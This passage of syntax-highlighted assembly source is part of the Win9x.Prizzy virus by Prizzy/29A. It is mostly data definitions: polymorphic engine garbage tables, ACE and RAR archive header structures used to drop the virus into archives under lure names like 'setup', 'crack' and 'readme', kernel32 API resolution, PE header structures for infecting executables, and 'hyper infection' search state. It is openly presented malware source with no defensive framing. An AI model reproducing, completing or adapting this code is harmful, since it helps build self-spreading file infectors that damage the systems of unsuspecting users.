        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mmx</span><span class="sc0">        </span><span class="sc1">;3rd use  great table)</span><span class="sc0">
</span><span class="sc5">end_garbage</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">__garbage_based_num</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__garbage_copro</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">__garbage_copro_num</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__garbage_mmx</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__garbage_copro</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">__garbage_mmx_num</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">end_garbage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__garbage_mmx</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ archivez struct ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ACE_Archive</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RAR_Archive</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Archive_Err</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Archive_NoErr</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACE_MagicSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">ACE_BeforeMagic</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">ACE_Magic</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'**ACE**'</span><span class="sc0">   </span><span class="sc1">;ACE signature</span><span class="sc0">

    </span><span class="sc5">Archive_MagicWhere</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ACE_MagicWhere</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">ACE_header_needed</span><span class="sc0"> </span><span class="sc1">;ACE archive (*.ACE)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">05C00h</span><span class="sc4">,</span><span class="sc2">300h</span><span class="sc0"> </span><span class="sc1">;ACE-SFX (DOS)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0DE00h</span><span class="sc4">,</span><span class="sc2">2200h</span><span class="sc0">    </span><span class="sc1">;ACE-SFX English/German</span><span class="sc0">
                        </span><span class="sc1">;(Win 95/98, NT 4.x)</span><span class="sc0">

</span><span class="sc5">RAR_MagicWhere</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">        </span><span class="sc1">;RAR archive (*.RAR)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2400h</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">  </span><span class="sc1">;RAR-SFX (DOS)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">5000h</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">  </span><span class="sc1">;RAR-SFX (Win 95/98, NT 4.x)</span><span class="sc0">

</span><span class="sc5">ACE_file_length</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ACEf_Filename</span><span class="sc4">-</span><span class="sc5">ACEf_HeadCRC</span><span class="sc0">
</span><span class="sc5">ACE_header_needed</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ACEh_Reserved1</span><span class="sc4">-</span><span class="sc5">ACEh_HeadCrc</span><span class="sc0">
</span><span class="sc5">ACE_without_filename</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ACEf_Filename</span><span class="sc4">-</span><span class="sc5">ACEf_HeadType</span><span class="sc0">

    </span><span class="sc5">ACE_header_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ACEh_HeadCrc</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;CRC of ACE header</span><span class="sc0">
</span><span class="sc5">ACEh_HeadSize</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;Header Size</span><span class="sc0">
</span><span class="sc5">ACEh_HeadType</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_HeadFlags</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;2048=mult_vol</span><span class="sc0">

</span><span class="sc5">ACEh_Signature</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;if u'll write ace_magic_size instead -7-, tasm32 will down</span><span class="sc0">
</span><span class="sc5">ACEh_VerMod</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_VerCr</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_HostCr</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_VolumeNumber</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;volume number of archive (ACE=0, C00=1...)</span><span class="sc0">
</span><span class="sc5">ACEh_TimeDate</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;Time&amp;Date packed</span><span class="sc0">
</span><span class="sc5">ACEh_Reserved1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_Reserved2</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_Reserved3</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_AvSize</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;internal comment</span><span class="sc0">
</span><span class="sc5">ACEh_Av</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ThisPlace</span><span class="sc0">
</span><span class="sc5">ACEh_CommentSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEh_Comment</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ThisPlace</span><span class="sc0">

    </span><span class="sc5">ACE_file_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ACEf_HeadCRC</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEf_HeadSize</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;i don't know 'cause ACEf_Filename isn't defined</span><span class="sc0">
</span><span class="sc5">ACEf_HeadType</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">ACEf_HeadFlags</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00008001h</span><span class="sc0">
</span><span class="sc5">ACEf_CompressedSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;filesize in archive</span><span class="sc0">
</span><span class="sc5">ACEf_UnCompressedSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;filesize on your disk</span><span class="sc0">
</span><span class="sc5">ACEf_TimeDate</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">ACEf_Attrib</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000020h</span><span class="sc0">
</span><span class="sc5">ACEf_CRC32</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;thx Vecna's CRC32 function</span><span class="sc0">
</span><span class="sc5">ACEf_TechType</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;STORED=0, LZ1=1</span><span class="sc0">
</span><span class="sc5">ACEf_TechQual</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEf_TechParm</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEf_Reserved</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACEf_FilenameSize</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;i don't know now</span><span class="sc0">
</span><span class="sc5">ACEf_Filename</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;only short name we'll generate</span><span class="sc0">


</span><span class="sc5">RAR_Magic</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Rar!'</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RAR_MagicSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">RAR_file_length</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">RAR_Filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">RAR_HeaderCRC</span><span class="sc0">
</span><span class="sc5">RAR_header_needed</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">RAR_CompressedSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">RAR_HeaderCRC</span><span class="sc0">
</span><span class="sc5">RAR_without_filename</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">RAR_Filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">RAR_HeaderType</span><span class="sc0">

    </span><span class="sc5">RAR_header_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">RAR_HeaderCRC</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">RAR_HeaderType</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">74h</span><span class="sc0">     </span><span class="sc1">;FILE_HEAD</span><span class="sc0">
</span><span class="sc5">RAR_FileFlags</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">08000h</span><span class="sc0">      </span><span class="sc1">;if (1=mult_vol)</span><span class="sc0">
</span><span class="sc5">RAR_HeaderSize</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;i don't know 'cause RAR_FileName isn't defined</span><span class="sc0">
</span><span class="sc5">RAR_CompressedSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RAR_UnCompressedSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RAR_HostOS</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;DOS=0, OS2=1, WIN_32=2, UNIX=3 - but i don't know now</span><span class="sc0">
</span><span class="sc5">RAR_FileCRC</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;haha, thx Vecna's CRC32 function</span><span class="sc0">
</span><span class="sc5">RAR_TimeDate</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">RAR_VersionNeed</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">RAR_Method</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc5">RAR_FilenameSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;i don't know now</span><span class="sc0">
</span><span class="sc5">RAR_FileAttribute</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000020h</span><span class="sc0">
</span><span class="sc5">RAR_Filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc1">; kernel32's base address</span><span class="sc0">

</span><span class="sc5">kernel_base</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;thx to z0mbie &amp; Vecna</span><span class="sc0">
</span><span class="sc5">gpa</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pGetProcAddress</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;address of this function</span><span class="sc0">
</span><span class="sc5">pGetDriveType</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;address of this function</span><span class="sc0">
</span><span class="sc5">gdt_flags</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;fixed &amp; remote disks</span><span class="sc0">

            </span><span class="sc1">; dropper's name to ACE/RAR</span><span class="sc0">

</span><span class="sc5">gen_archive_number</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">gen_archive_filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'install'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'setup'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'run'</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'sound'</span><span class="sc4">,</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'config'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'help'</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'gratis'</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'crack'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'readme'</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">szAuthor</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Win9x.Prizzy - hyper infection, copro &amp; mmx "</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"poly-engine, ACE/RAR dropper"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"(c)oded by Prizzy/29A, welcome to my world..."</span><span class="sc0">

        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ memory buffer which ain't in file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">file_end</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">;work with filez</span><span class="sc0">

</span><span class="sc5">filename_ptr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;pointer to filename</span><span class="sc0">
</span><span class="sc5">filename_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">     </span><span class="sc1">;MAX_SIZE defined by M$</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">filename_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">file_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;open file handle</span><span class="sc0">

        </span><span class="sc1">;are we inside IFS ?</span><span class="sc0">

</span><span class="sc5">in_ifs</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;are we in IFS now ?</span><span class="sc0">
</span><span class="sc5">last_idt</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0000000000000000h</span><span class="sc0">

        </span><span class="sc1">;hyper infection</span><span class="sc0">

</span><span class="sc5">search_filename</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">filename_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">search_finished</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;has hyper infection finished ?</span><span class="sc0">
</span><span class="sc5">search_start</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;have we begun yet ?</span><span class="sc0">
</span><span class="sc5">search_address</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;address of dta's in memory</span><span class="sc0">
</span><span class="sc5">search_plunge</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;how many dirz we have in</span><span class="sc0">
</span><span class="sc5">search_handle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;FindFirstFile handle</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc0">     </span><span class="sc5">dta_struc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">     </span><span class="sc1">;main dta struc for search_handle</span><span class="sc0">

        </span><span class="sc1">;structs of PE file</span><span class="sc0">

</span><span class="sc5">mz_header</span><span class="sc0">   </span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;old EXE header</span><span class="sc0">
</span><span class="sc5">pe_signature</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;'PE\0\0'</span><span class="sc0">
</span><span class="sc5">pe_header</span><span class="sc0">   </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;main header</span><span class="sc0">
</span><span class="sc5">pe_optional</span><span class="sc0"> </span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;advanced header</span><span class="sc0">
</span><span class="sc5">pe_section</span><span class="sc0">  </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">   </span><span class="sc1">;sections of EXE's</span><span class="sc0">

</span><span class="sc5">pe_actsection</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;last section</span><span class="sc0">

        </span><span class="sc1">;archivez struc</span><span class="sc0">

</span><span class="sc5">Archive_BufSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">65536</span><span class="sc0">           </span><span class="sc1">;this is only for EXE-SFX 'cause there's self-EXE encrypt code</span><span class="sc0">

</span><span class="sc5">Archive_Number</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;search in XXX,XXX-SFX (DOS),XXX-SFX (Win32)</span><span class="sc0">
</span><span class="sc5">Archive_Buffer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;readed buffer to search XXX_Magic</span><span class="sc0">

</span><span class="sc5">Archive_Filename_Sz</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;file size of Archive_Filename</span><span class="sc0">
</span><span class="sc5">Archive_Filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">filename_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">file_in_mem</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where's file to calculate CRC32</span><span class="sc0">

        </span><span class="sc1">;data used by Prizzy Polymorphic Engine (PPE)</span><span class="sc0">

</span><span class="sc5">ppe_buf_start</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">rnd_last</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;last number in get_rnd32 function</span><span class="sc0">
</span><span class="sc5">garbage_style</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;have I use unmodify flags instructions ?</span><span class="sc0">

</span><span class="sc5">used_regs</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;used eax,ecx,edx...</span><span class="sc0">
</span><span class="sc5">used_regs_mmx</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;used mm0,mm1...mm7</span><span class="sc0">
</span><span class="sc5">used_regs_copro</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;used st(0),st(1)...st(7)</span><span class="sc0">
</span><span class="sc5">gl_index_reg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;which reg is index ?</span><span class="sc0">

</span><span class="sc5">mem_address</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where's copy of this virus</span><span class="sc0">
</span><span class="sc5">poly_start</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where poly decoder start</span><span class="sc0">
</span><span class="sc5">poly_finish</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where poly decoder finish</span><span class="sc0">
</span><span class="sc5">recursive_level</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;garbage recursive layer</span><span class="sc0">
</span><span class="sc5">recursive_lmmx</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;mmx recursive level</span><span class="sc0">
</span><span class="sc5">copro_or_mmx</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;index/code/counter in copro or mmx ?</span><span class="sc0">

</span><span class="sc5">index_reg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;index_reg is in 0=base, 1=copro, 2=mmx</span><span class="sc0">
</span><span class="sc5">index_reg_place</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;register in (base/copro/mmx)-reg</span><span class="sc0">
</span><span class="sc5">index_reg_get</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;getted index_reg ?</span><span class="sc0">
</span><span class="sc5">counter_reg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;counter_reg is in 0=base, 1=copro, 2=mmx</span><span class="sc0">
</span><span class="sc5">counter_reg_place</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;register in (base/copro/mmx)-reg</span><span class="sc0">
</span><span class="sc5">code_reg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;code_reg is in 0=base, 1=copro, 2=mmx</span><span class="sc0">
